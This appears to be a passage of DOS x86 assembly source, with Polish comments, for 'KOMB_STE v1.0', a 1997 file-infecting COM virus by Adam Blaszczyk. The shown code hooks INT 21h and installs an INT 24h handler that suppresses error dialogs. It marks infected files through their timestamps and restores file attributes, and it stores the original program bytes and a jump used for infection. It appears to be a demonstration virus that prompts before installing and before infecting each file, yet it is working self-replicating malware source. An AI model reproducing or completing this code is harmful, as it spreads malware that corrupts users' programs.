\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,VZnacznik                     ; zaznacz w dacie infekcje pliku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,5701h                         ; funkcja DOS - wpisz date, czas}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ZamknijPlik:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,3Eh                           ; funkcja DOS - zamknij plik}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocAtrybut:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cl,cs:Atrybut                    ; podaj stary atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ch,0                             ; CX=CL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   dx,cs:StaryDX                    ; \\ podaj nazwe pliku do zmiany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ds,cs:StaryDS                    ; / w DS:DX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,4301h                         ; funkcja DOS - zmien atrybut}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; wywolaj stare przerwanie 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  PrzywrocStare24}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   di si dx cx bx ax ds es          ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PowrotZInt21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db 0EAh                                ; mnemonik rozkazu skoku JMP FAR}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Stare21Ofs dw ?                        ; z tych pol korzysta skok}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Stare21Seg dw ?                        ; aby oddac sterowanie do poprzedniego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; elementu lancucha przerwan INT 21}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch StareInt21:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pushf                                  ; \\ symuluj  wywolanie przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call dword ptr cs:[Stare21Ofs]         ; / wyowlaj stare przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powroc z wywolania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch UstawNowe24:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ds es ax bx dx                   ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,3524h                         ; \\     pobierz stara i ustaw}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ;  \\    nowa procedure obslugi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Stare24Seg,es                 ;   \\   przerwania krytycznego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   cs:Stare24Ofs,bx                 ;    \\  INT 24h w celu ochrony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ;     \\ przed ewentulanymi bledami}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  cs                               ;     / (np; podczas proby zapisu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ds                               ;    /   na zabezpieczona przed}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea   dx,NoweInt24                     ;   /    zapisem dyskietce nie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,2524h                         ;  /     zostanie wywolany dialog}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; /      ARIF)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   dx bx ax es ds                   ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powroc z wywolania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrzywrocStare24:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ds ax dx                         ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lds   dx,dword ptr cs:Stare24Ofs       ; \\  przywroc stare przerwanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ax,2524h                         ;  - INT 24}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  StareInt21                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   dx ax ds                         ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukSI:                                    ; procedura wyswietla tekst z}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; CS:[DI+SI]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   di,si                            ; tekst w DI, dodaj SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk:                                      ; procedura wyswietla tekst z}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; CS:[DI]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax di                            ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPetla:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,[di]                          ; pobierz znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     or    al,al                            ; czy koniec tekstu (znak=NUL) ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jz    DrukPowrot                       ; TAK - koncz pisanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0Eh                           ; funkcja BIOS - wyswietl znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     inc   di                               ; zwieksz indeks (na nastepny znak)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   short DrukPetla                  ; idz po nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   di ax                            ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHEX16:                                 ; drukuje liczbe heksalna z AX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zachowaj AX (dokladniej AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,ah                            ; najpierw starsza czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukHex8                         ; wyswietl AH}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc AX (dokladniej AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; i wyswietl AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHex8:                                  ; drukuje liczbe heksalna z AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push  ax                               ; zachowaj AX (dokladniej 4 bity AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ;  \\ podziel AL przez 16}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ;  / czyli wez 4 starsze bity AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     shr   al,1                             ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     Call  DrukHex4                         ; i wydrukuj czesc liczby szesnastkowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop   ax                               ; przywroc AX (dokladniej 4 bity AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,15                            ; wez 4 mlodsze bity AL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; i wydrukuj czesc liczby szesnastkowej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukHex4:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,10                            ; \\   konwersja liczby binarnej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jb    Cyfra09                          ;  \\  na znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   al,'A'-'0'-10                    ;   - 00..09, 0Ah..0Fh na}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Cyfra09:                                   ;  /  '0'..'9', 'A'..'F'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     add   al,'0'                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0Eh                           ; funkcja BIOS - wyswietl znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                              ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Decyzja:                                   ; \\     pobiera z klawiatury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0h                            ;  \\    znak i sprawdza czy jest}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   16h                              ;   \\   to litera 'T'lub 't'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,0DFh                          ;    \\  jesli tak, ustawia CF=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,'T'                           ;     \\ jesli nie, ustawia CF=1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     clc                                    ;     /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    DecyzjaTak                       ;    /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     stc                                    ;   /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DecyzjaTak:                                ;  /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweInt24:                                 ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   al,3                             ; sygnalizuj CF=1, gdy dowolny blad}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; nie wywoluj ARIF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     iret                                   ; powrot z przerwania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeCopyRight        db CR,LF,'KOMB_STE v1.0, Autor : Adam Blaszczyk 1997',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeInstalacja       db CR,LF,'_ Zainstalowac KOMB_STE w pamieci operacyjnej (T/N) ?',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeBylZainstalowany db CR,LF,'_ KOMB_STE jest juz w pamieci !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeZainstalowany    db CR,LF,'_ KOMB_STE zostal zainstalowany w segmencie : ',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeZnalazlemPlik    db CR,LF,'_ Znalazlem plik : "',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch   TeInfekcja         db '"',CR,LF,'  Czy chcesz sprobowac zainfekowac go wirusem KOMB_STE (T/N) ?',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StareBajty db 0CDh,20h,90h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Skok       db 0E9h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch KoniecWirusa:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Skok2      dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StaryDS    dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      StaryDX    dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Atrybut    db ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Czas       dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Stare24Ofs dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      Stare24Seg dw ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
